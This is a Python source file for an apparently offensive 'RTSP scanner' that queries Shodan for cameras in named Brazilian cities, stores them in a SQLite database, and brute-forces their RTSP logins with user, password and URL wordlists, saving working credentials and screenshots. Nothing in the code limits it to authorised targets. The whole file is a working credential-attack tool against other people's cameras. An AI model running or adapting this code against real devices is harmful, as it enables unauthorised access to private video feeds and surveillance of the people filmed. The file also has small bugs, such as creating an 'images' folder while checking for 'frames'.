import base64
import itertools
import os
import random
import socket
import sqlite3
from pprint import pprint
from threading import Thread
from time import sleep
import logging

import argparse as argparse
import cv2
import shodan
from dotenv import load_dotenv

from shodan.helpers import get_screenshot


__version__ = '0.1.0'

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s %(message)s',
    handlers=[
        logging.FileHandler("rtsp_scanner.log"),
        logging.StreamHandler()
    ]
)


def create_db():
    conn = sqlite3.connect('rtsp_scanner.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS cameras
        (id INTEGER PRIMARY KEY AUTOINCREMENT,ip TEXT,port INTEGER,user TEXT,password TEXT,url TEXT,active INTEGER DEFAULT 0, added_at DATETIME DEFAULT CURRENT_TIMESTAMP, updated_at DATETIME DEFAULT CURRENT_TIMESTAMP)
    '''.strip().replace('\n', ' ').replace('\t', ' '))
    conn.commit()
    conn.close()


def migrate_fields_table_db():
    conn = sqlite3.connect('rtsp_scanner.db')
    c = conn.cursor()
    c.execute(
        '''ALTER TABLE cameras ADD COLUMN city VARCHAR(255) DEFAULT '.'; '''.strip().replace('\n', ' ').replace('\t', ' ')
    )
    c.execute(
        '''ALTER TABLE cameras ADD COLUMN country_code VARCHAR(255) DEFAULT '.'; '''.strip().replace('\n', ' ').replace('\t', ' ')
    )
    conn.commit()
    conn.close()


def insert_into_db(ip, port, user, password, url, city, country_code):
    conn = sqlite3.connect('rtsp_scanner.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO cameras(ip, port, user, password, url, city, country_code) VALUES(?, ?, ?, ?, ?, ?, ?)
    '''.strip(), (ip, port, user, password, url, city, country_code))
    conn.commit()
    conn.close()


def get_random_from_db():
    conn = sqlite3.connect('rtsp_scanner.db')
    c = conn.cursor()
    c.execute('''
        SELECT * FROM cameras WHERE active = 0 ORDER BY RANDOM()
    '''.strip())
    result = c.fetchall()
    conn.close()
    return result

def get_from_db():
    conn = sqlite3.connect('rtsp_scanner.db')
    c = conn.cursor()
    c.execute('''
        SELECT * FROM cameras WHERE active = 0
    '''.strip())
    result = c.fetchall()
    conn.close()
    return result


def search_on_db(ip, port):
    conn = sqlite3.connect('rtsp_scanner.db')
    c = conn.cursor()
    c.execute('''
        SELECT * FROM cameras WHERE ip = ? AND port = ?
    '''.strip(), (ip, port))
    result = c.fetchall()
    conn.close()
    return result


def update_active_from_db(ip, port):
    conn = sqlite3.connect('rtsp_scanner.db')
    c = conn.cursor()
    c.execute('''
        UPDATE cameras SET active = 1 WHERE ip = ? AND port = ?
    '''.strip(), (ip, port))
    conn.commit()
    conn.close()


def update_from_db_values(host, port, user, password, rtsp_string, active):
    conn = sqlite3.connect('rtsp_scanner.db')
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO cameras (ip, port, user, password, url, active, updated_at) VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP); 
    '''.strip(), (
        host, port, user, password, rtsp_string, active
    ))
    conn.commit()
    conn.close()


def write_image_to_file(ss, h, p):
    mime = ss['mime'].split('/')[-1]
    with open(f'frames/{h}_{p}.{mime}', 'wb') as img:
        img.write(base64.b64decode(ss['data']))


def check_rtsp_connection_by_host(host, port, user, password, rtsp_string):
    rtsp_url = rtsp_string.format(user, password, host, port)
    logging.debug(f'{rtsp_url}')
    vcap = cv2.VideoCapture(rtsp_url)
    try:
        ret, frame = vcap.read()
        if not frame:
            logging.debug(f'No frame for {rtsp_url}')
            return None
        logging.info(f'[!!] Connected to camera with RTSP URL: {rtsp_url}, user: {user}, password: {password}')
        update_from_db_values(host, port, user, password, rtsp_url, 1)
        return rtsp_url
    except Exception as e:
        logging.error(f'Error: {e}')
        return None
    finally:
        logging.debug(f'Releasing {rtsp_url}')
        vcap.release()


def is_camera(host, port, path):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.send(f'GET {path} HTTP/1.0\r\n\r\n'.encode())
        res = sock.recv(100)
        if res.find(b'200 OK') > 0:
            update_active_from_db(host, port)
            return True
        return False
    except Exception as e:
        return False


def thread_add_cameras_on_db(timeout):
    query = 'city:"Itatiba,Valinhos,Campinas" cam'
    logging.debug(f'Starting thread_add_cameras_on_db using query "{query}" with {timeout} seconds of timeout')
    api = shodan.Shodan(os.getenv('SHODAN_KEY'))
    results = api.search_cursor(query)

    logging.info('Updating database')
    for banner in results:
        ip, port = banner.get('ip_str'), banner.get('port')
        db_response = search_on_db(ip, port)
        if db_response:
            logging.info(f'{ip}:{port} skipped')
        else:
            city = banner.get('location').get('city')
            country_code = banner.get('location').get('country_code')
            insert_into_db(ip, port, '.', '.', '.', city, country_code)
            logging.info(f'{ip}:{port} added')
        if banner.get('screenshot'):
            screenshot = get_screenshot(banner)
            write_image_to_file(screenshot, ip, port)
    logging.info(f'Waiting {timeout} seconds to update database')
    sleep(timeout)


def thread_test_cameras(executor_threads, timeout, users_wordlist, passwords_wordlist, rtsp_urls_wordlist, randomize):
    logging.info(f'Starting thread_test_cameras with {executor_threads} threads')

    camera_users = open(users_wordlist, 'r').read().splitlines()
    camera_passwords = open(passwords_wordlist, 'r').read().splitlines()
    rtsp_url_type = open(rtsp_urls_wordlist, 'r').read().splitlines()

    if randomize:
        random.shuffle(camera_users)
        random.shuffle(camera_passwords)
        random.shuffle(rtsp_url_type)

    logging.debug(f'Using {executor_threads} threads in thread_test_cameras')
    cameras = get_random_from_db()
    logging.debug(f'Testing {len(cameras)} cameras')
    camera_combinations = itertools.product(rtsp_url_type, camera_users, camera_passwords, cameras)
    for url, user, password, camera in camera_combinations:
        ip, port = camera[1], camera[2]
        url_login = url.format(user, password, ip, port)
        check_rtsp_connection_by_host(ip, port, user, password, url_login)
    logging.info(f'Executors: finished in thread_test_cameras')


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--start_search', action='store_true', help='Start searching for cameras on Shodan', default=False)
    group.add_argument('--start_check', action='store_true', help='Start testing cameras on DB', default=False)

    parser.add_argument('--threads', action='store', help='Number of threads to check cams', default=1, type=int)
    parser.add_argument('--test_sleep', action='store', help='Test cameras in DB every N seconds', default=30, type=int)
    parser.add_argument('--db_sleep', action='store', help='Update DB with Shodan every N seconds', default=60 * 60 * 24, type=int)  # 1 day
    parser.add_argument('--users', action='store', help='Path to users file', default='users_small.txt')
    parser.add_argument('--passwords', action='store', help='Path to passwords file', default='passwords_small.txt')
    parser.add_argument('--rtsp_urls', action='store', help='Path to rtsp urls file', default='rtsp_urls_small.txt')
    parser.add_argument('--random', action='store_true', help='Randomize users, passwords and rtsp urls', default=True)
    parser.add_argument('--db_name', action='store', help='Name of the database', default='rtsp_scanner.db')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode', default=False)

    def check_paths(args):
        if not os.path.exists(args.users):
            parser.error(f'Users file "{args.users}" not found')
            return False
        if not os.path.exists(args.passwords):
            parser.error(f'Passwords file "{args.passwords}" not found')
            return False
        if not os.path.exists(args.rtsp_urls):
            parser.error(f'RTSP URLs file "{args.rtsp_urls}" not found')
            return False
        if not os.path.exists(args.db_name):
            logging.info(f'Database "{args.db_name}" not found, creating now')
            create_db()
        if not os.path.exists('frames'):
            logging.info(f'Frames folder not found, creating now')
            os.mkdir('images')
        return True

    if check_paths(parser.parse_args()):
        return parser.parse_args()

    raise Exception('Error parsing arguments')


def main():

    args = parse_arguments()

    arg_threads = args.threads
    arg_test_timeout = args.test_sleep
    arg_db_timeout = args.db_sleep

    wd_users = args.users
    wd_passwords = args.passwords
    wd_rtsp_urls = args.rtsp_urls

    arg_random = args.random

    verbose = args.verbose
    if verbose:
        logging.basicConfig(level=logging.DEBUG)
        logging.info('Verbose mode enabled')
        args_data = vars(args)
        args_data['users'] = {
            'path': wd_users,
            'count': len(open(wd_users, 'r').read().splitlines())
        }
        args_data['passwords'] = {
            'path': wd_passwords,
            'count': len(open(wd_passwords, 'r').read().splitlines())
        }
        args_data['rtsp_urls'] = {
            'path': wd_rtsp_urls,
            'count': len(open(wd_rtsp_urls, 'r').read().splitlines())
        }
        pprint(args_data, indent=4)

    if args.start_search:
        thread_db = Thread(target=thread_add_cameras_on_db, args=(arg_db_timeout,))
        thread_db.start()

    if args.start_check:
        thread_test_cameras(arg_threads, arg_test_timeout, wd_users, wd_passwords, wd_rtsp_urls, arg_random)


if __name__ == '__main__':
    main()
